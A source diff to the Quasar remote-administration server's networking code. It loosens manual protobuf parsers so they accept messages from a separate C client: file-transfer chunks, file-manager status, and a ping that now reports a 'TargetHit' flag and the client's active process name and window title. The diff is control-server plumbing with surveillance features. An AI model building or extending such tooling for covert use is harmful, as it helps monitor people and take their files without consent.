@@ -570,13 +570,15 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client FileTransferChunk (subtype 34) = 08 22 + field 1 Id (varint), 2 FilePath (string), 3 FileSize (varint64), 4 Chunk (len: Offset varint, Data bytes). */
+        /* Fallback: C client FileTransferChunk.
+         * Remote header uses subtype 33, but older server code hardcoded subtype 34 here.
+         * Accept both to be resilient to subtype drift. */
         private static bool TryParseRawFileTransferChunk(byte[] payload, int start, int length, out FileTransferChunk result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 34) return false;
+            if (subtype != 33 && subtype != 34) return false;
             int id = 0;
             string filePath = null;
             long fileSize = 0;
@@ -630,13 +632,15 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client FileTransferComplete (subtype 35) = 08 23 + field 1 Id (varint), 2 FilePath (string). */
+        /* Fallback: C client FileTransferComplete.
+         * Remote header uses subtype 34, but older server code hardcoded subtype 35 here.
+         * Accept both to be resilient to subtype drift. */
         private static bool TryParseRawFileTransferComplete(byte[] payload, int start, int length, out FileTransferComplete result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 35) return false;
+            if (subtype != 34 && subtype != 35) return false;
             int id = 0;
             string filePath = null;
             while (offset < end)
@@ -798,13 +802,18 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client SetStatusFileManager (subtype 65) = 08 41 + field 1 Message (0x0A string), field 2 SetLastDirectorySeen (0x10 varint). */
+        /* Fallback: C client SetStatusFileManager.
+         * Wire subtype can drift (e.g. 65 vs 69) depending on TypeRegistry order.
+         * Body format:
+         *   field 1 Message (string, 0x0A)
+         *   field 2 SetLastDirectorySeen (bool varint, 0x10)
+         */
         private static bool TryParseRawSetStatusFileManager(byte[] payload, int start, int length, out SetStatusFileManager result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 65) return false;
+            if (subtype != 65 && subtype != 69) return false;
             string msg = null;
             bool setLast = false;
             while (offset < end)
@@ -1359,31 +1368,66 @@ namespace Quasar.Server.Networking
 
             ping = new ClientPingRequest();
 
-            // Parse body: expect field 1 (Uuid) as length-delimited: tag 0x0A.
+            // Parse body (manual protobuf decoding) and extract known fields:
+            //   field 1: Uuid (string, wire=2)
+            //   field 2: TargetHit (bool, wire=0)
+            //   field 3: ActiveProcessName (string, wire=2)
+            //   field 4: ActiveWindowTitle (string, wire=2)
             int bodyPos = payloadStart + 1 + consumed;
-            if (bodyPos >= end) return true; // no body -> empty uuid
+            if (bodyPos >= end) return true; // no body -> empty fields
 
-            // Field tag 1 with wire length (2) is 0x0A.
-            if (payload[bodyPos] != 0x0A) return true;
-            bodyPos++;
-
-            // Read string length varint.
-            uint strLen = 0;
-            int shift = 0;
-            int lenConsumed = 0;
-            while (bodyPos < end && lenConsumed < 5)
+            while (bodyPos < end)
             {
-                byte b = payload[bodyPos++];
-                strLen |= (uint)(b & 0x7F) << shift;
-                shift += 7;
-                lenConsumed++;
-                if ((b & 0x80) == 0) break;
+                byte tag = payload[bodyPos++];
+                int field = tag >> 3;
+                int wire = tag & 7;
+
+                if (wire == 0)
+                {
+                    // varint (bool)
+                    uint v = 0;
+                    int shift = 0;
+                    int lenConsumed = 0;
+                    while (bodyPos < end && lenConsumed < 5)
+                    {
+                        byte b = payload[bodyPos++];
+                        v |= (uint)(b & 0x7F) << shift;
+                        shift += 7;
+                        lenConsumed++;
+                        if ((b & 0x80) == 0) break;
+                    }
+
+                    if (field == 2) ping.TargetHit = (v != 0);
+                    continue;
+                }
+                if (wire == 2)
+                {
+                    // length-delimited
+                    uint lenDel = 0;
+                    int shift = 0;
+                    int lenConsumed = 0;
+                    while (bodyPos < end && lenConsumed < 5)
+                    {
+                        byte b = payload[bodyPos++];
+                        lenDel |= (uint)(b & 0x7F) << shift;
+                        shift += 7;
+                        lenConsumed++;
+                        if ((b & 0x80) == 0) break;
+                    }
+                    if (lenDel == 0) continue;
+                    if (bodyPos + (int)lenDel > end) return false;
+
+                    if (field == 1) ping.Uuid = Encoding.UTF8.GetString(payload, bodyPos, (int)lenDel);
+                    else if (field == 3) ping.ActiveProcessName = Encoding.UTF8.GetString(payload, bodyPos, (int)lenDel);
+                    else if (field == 4) ping.ActiveWindowTitle = Encoding.UTF8.GetString(payload, bodyPos, (int)lenDel);
+                    bodyPos += (int)lenDel;
+                    continue;
+                }
+
+                // Unknown wire type: bail out.
+                break;
             }
 
-            if (strLen == 0) return true;
-            if (bodyPos + (int)strLen > end) return false;
-
-            ping.Uuid = Encoding.UTF8.GetString(payload, bodyPos, (int)strLen);
             return true;
         }
 
